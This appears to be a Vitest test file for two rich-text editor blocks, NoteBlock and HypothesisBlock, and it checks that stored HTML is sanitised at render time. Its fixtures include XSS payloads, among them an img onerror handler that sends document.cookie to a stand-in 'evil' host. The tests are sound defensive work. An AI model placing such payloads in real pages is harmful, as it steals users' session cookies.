import { describe, expect, it } from 'vitest';
import NoteBlock, { sanitizeNoteHtml } from './NoteBlock';
import HypothesisBlock from './HypothesisBlock';

describe('NoteBlock render-time sanitization', () => {
  it('strips img/onerror XSS payloads from stored text', () => {
    const block = new NoteBlock({
      data: {
        text: '<img src=x onerror="fetch(\'https://evil/?c=\'+document.cookie)">hi',
        variant: 'note',
      },
      readOnly: true,
    });
    const el = block.render();
    const text = el.querySelector<HTMLElement>('.cm-note-text')!;
    expect(text.innerHTML).not.toContain('<img');
    expect(text.innerHTML).not.toContain('onerror');
    expect(text.textContent).toContain('hi');
  });

  it('keeps allowed formatting and https links but drops javascript: hrefs and extra attrs', () => {
    const out = sanitizeNoteHtml(
      '<b>bold</b> <a href="javascript:alert(1)" onclick="alert(2)">bad</a> <a href="https://ok.example">ok</a>'
    );
    expect(out).toContain('<b>bold</b>');
    expect(out).not.toContain('javascript:');
    expect(out).not.toContain('onclick');
    expect(out).toContain('href="https://ok.example"');
  });
});

describe('HypothesisBlock render-time sanitization', () => {
  it('strips script/event-handler payloads from statement and prediction', () => {
    const block = new HypothesisBlock({
      data: {
        statement: '<img src=x onerror="alert(1)"><i>churn drops</i>',
        prediction: '<script>alert(2)</script>-12%',
        status: 'proposed',
      },
      readOnly: true,
    });
    const el = block.render();
    const statement = el.querySelector<HTMLElement>('.cm-hyp-statement')!;
    const prediction = el.querySelector<HTMLElement>('.cm-hyp-prediction')!;
    expect(statement.innerHTML).not.toContain('onerror');
    expect(statement.innerHTML).toContain('<i>churn drops</i>');
    expect(prediction.innerHTML).not.toContain('<script');
    expect(prediction.textContent).toContain('-12%');
  });
});
